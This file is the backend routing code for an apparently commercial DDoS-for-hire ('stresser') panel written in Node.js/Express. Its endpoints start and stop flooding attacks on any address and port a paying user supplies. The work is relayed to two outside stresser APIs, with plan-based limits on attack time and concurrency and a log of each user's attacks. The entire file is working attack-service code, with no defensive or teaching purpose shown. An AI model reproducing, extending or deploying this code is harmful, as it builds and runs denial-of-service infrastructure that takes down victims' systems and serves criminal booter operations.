const express = require('express');
const router = express.Router();
const Attack = require('../models/Attack');
const AttackLog = require('../models/AttackLog');
const User = require('../models/User');
const ensureAuthenticated = require('../middleware/authMiddleware');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');
const apiConfig = require('../config/apiConfig');
const methods = require('../methods.json');

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const selectAPIAndSendAttack = async(attackParams, apiName, apiMethodName, count, maxCount) => {
    if (count >= maxCount) return null;

    let response;
    try {
        if (apiName === 'dreamStresser') {
            response = await axios.get(`${apiConfig.dreamStresser.baseUrl}`, {
                params: {
                    key: apiConfig.dreamStresser.api_key,
                    host: attackParams.address,
                    port: attackParams.port,
                    time: attackParams.duration,
                    method: apiMethodName,
                    vip: 0
                }
            });
        } else if (apiName === 'stresserAsia') {
            response = await axios.get(`${apiConfig.stresserAsia.baseUrl}/start`, {
                params: {
                    api_key: apiConfig.stresserAsia.api_key,
                    user: 384,
                    target: attackParams.address,
                    time: attackParams.duration,
                    port: attackParams.port,
                    method: apiMethodName
                }
            });
        }

        if ((apiName === 'dreamStresser' && response.data.Status === 'Success') ||
            (apiName === 'stresserAsia' && response.data.status === "true")) {
            return {
                attackId: apiName === 'stresserAsia' ? response.data.stopper : null,
                success: true,
                api: apiName
            };
        }

        throw new Error(`Invalid response from ${apiName} API: ${JSON.stringify(response.data)}`);
    } catch (error) {
        if (error.response && error.response.status === 429) {
            console.log(`Rate limit reached for ${apiName}, waiting before retry...`);
            await delay(5000);
            return selectAPIAndSendAttack(attackParams, apiName, apiMethodName, count, maxCount);
        }

        console.error(`Error sending attack to ${apiName}: ${error.message}`);
        return null;
    }
};

const stopAttack = async(attack) => {
    try {
        if (attack.api === 'dreamStresser') {
            await axios.get(`${apiConfig.dreamStresser.baseUrl}`, {
                params: {
                    key: apiConfig.dreamStresser.api_key,
                    host: attack.ip,
                    port: attack.port,
                    time: attack.time,
                    method: 'STOP',
                    vip: 0
                }
            });
        } else if (attack.api === 'stresserAsia') {
            await axios.get(`${apiConfig.stresserAsia.baseUrl}/stop`, {
                params: {
                    api_key: apiConfig.stresserAsia.api_key,
                    user: 384,
                    stopper: attack.attackId
                }
            });
        }
    } catch (error) {
        if (error.response && error.response.status === 429) {
            console.log(`Rate limit reached for stopping attack with ID ${attack.id}, waiting before retry...`);
            await delay(5000);
            return stopAttack(attack);
        }
        console.error(`Error stopping attack with ID ${attack.id}:`, error.message);
    }
};

router.post('/start-attack', ensureAuthenticated, async(req, res) => {
    const { address, port, duration, method, concurrents, layer } = req.body;
    const userId = req.session.user._id;

    try {
        const user = await User.findById(userId);
        if (!user.activePlan) {
            return res.status(500).json({ message: 'You don\'t have an active plan.', type: 'error' });
        }

        if (duration > user.maxAttackTime) {
            return res.status(500).json({ message: 'Time exceeds your plan limit.', type: 'error' });
        }

        const activeConcurrents = await Attack.countDocuments({ userId });
        if (activeConcurrents + parseInt(concurrents, 10) > user.concurrents) {
            return res.status(400).json({ message: 'Concurrents exceed your plan limit.', type: 'error' });
        }

        const methodInfo = methods.find(m => m.methodName === method);
        if (!methodInfo) {
            return res.status(400).json({ message: 'Invalid method selected.', type: 'error' });
        }

        let dreamStresserCount = await Attack.countDocuments({ userId, api: 'dreamStresser' });
        let stresserAsiaCount = await Attack.countDocuments({ userId, api: 'stresserAsia' });

        const attackPromises = [];
        let remainingConcurrents = parseInt(concurrents, 10);

        while (remainingConcurrents > 0) {
            let sentAttack = false;

            if (dreamStresserCount < apiConfig.dreamStresser.maxConcurrents) {
                const dreamMethod = methodInfo.apis.find(m => m.name === 'dreamStresser');
                if (dreamMethod) {
                    attackPromises.push(selectAPIAndSendAttack({ address, port, duration, method, layer, userId },
                        'dreamStresser',
                        dreamMethod.methodApiName,
                        dreamStresserCount,
                        apiConfig.dreamStresser.maxConcurrents
                    ));
                    dreamStresserCount++;
                    remainingConcurrents--;
                    sentAttack = true;
                }
            }

            if (remainingConcurrents > 0 && stresserAsiaCount < apiConfig.stresserAsia.maxConcurrents) {
                const asiaMethod = methodInfo.apis.find(m => m.name === 'stresserAsia');
                if (asiaMethod) {
                    attackPromises.push(selectAPIAndSendAttack({ address, port, duration, method, layer, userId },
                        'stresserAsia',
                        asiaMethod.methodApiName,
                        stresserAsiaCount,
                        apiConfig.stresserAsia.maxConcurrents
                    ));
                    stresserAsiaCount++;
                    remainingConcurrents--;
                    sentAttack = true;
                }
            }

            if (!sentAttack) {
                return res.status(400).json({
                    message: `No slots available for the method ${method}.`,
                    type: 'error'
                });
            }
        }

        const results = await Promise.all(attackPromises);
        const successfulAttacks = results.filter(Boolean);

        if (successfulAttacks.length > 0) {
            const attacks = successfulAttacks.map(result => ({
                id: uuidv4(),
                api: result.api,
                ip: address,
                port,
                method,
                time: duration,
                startTime: new Date(),
                userId,
                attackId: result.attackId
            }));

            await Attack.insertMany(attacks);

            const logs = attacks.map(attack => ({
                id: attack.id,
                api: attack.api,
                ip: attack.ip,
                port: attack.port,
                concurrents: concurrents,
                method: attack.method,
                time: attack.time,
                startTime: attack.startTime,
                userId: attack.userId,
                layer: layer
            }));
            await AttackLog.insertMany(logs);

            user.attackCount += successfulAttacks.length;
            await user.save();

            if (successfulAttacks.length < concurrents) {
                return res.status(200).json({
                    message: `${successfulAttacks.length} attack(s) started successfully, but no available slots for the remaining attacks.`,
                    type: 'warning'
                });
            }

            return res.status(200).json({ message: `${successfulAttacks.length} attack(s) started successfully!`, type: 'success' });
        } else {
            return res.status(500).json({ message: 'Failed to start any attacks.', type: 'error' });
        }

    } catch (error) {
        console.error('Error starting attack:', error.message);
        return res.status(500).json({ message: 'Error starting attack.', type: 'error' });
    }
});

router.post('/stop-attack/:id', ensureAuthenticated, async(req, res) => {
    const attackId = req.params.id;
    const userId = req.session.user._id;

    try {
        const attackToStop = await Attack.findOne({ id: attackId, userId });
        if (!attackToStop) {
            return res.status(500).json({ message: 'Attack not found or you do not have permission.', type: 'error' });
        }

        await stopAttack(attackToStop);
        await Attack.deleteOne({ id: attackId });

        return res.status(200).json({ message: 'Attack successfully stopped.', type: 'success' });
    } catch (error) {
        console.error('Error stopping attack:', error.message);
        return res.status(500).json({ message: 'Error stopping attack.', type: 'error' });
    }
});

router.post('/stop-attacks', ensureAuthenticated, async(req, res) => {
    const userId = req.session.user._id;

    try {
        const userAttacks = await Attack.find({ userId });

        if (userAttacks.length === 0) {
            return res.status(500).json({ message: 'You have no attacks in progress.', type: 'error' });
        }

        for (const attack of userAttacks) {
            await stopAttack(attack);
            await Attack.deleteOne({ id: attack.id });
        }

        return res.status(200).json({ message: 'All attacks were successfully stopped.', type: 'success' });
    } catch (error) {
        console.error('Error stopping all attacks:', error.message);
        return res.status(500).json({ message: 'Error stopping attacks.', type: 'error' });
    }
});

module.exports = router;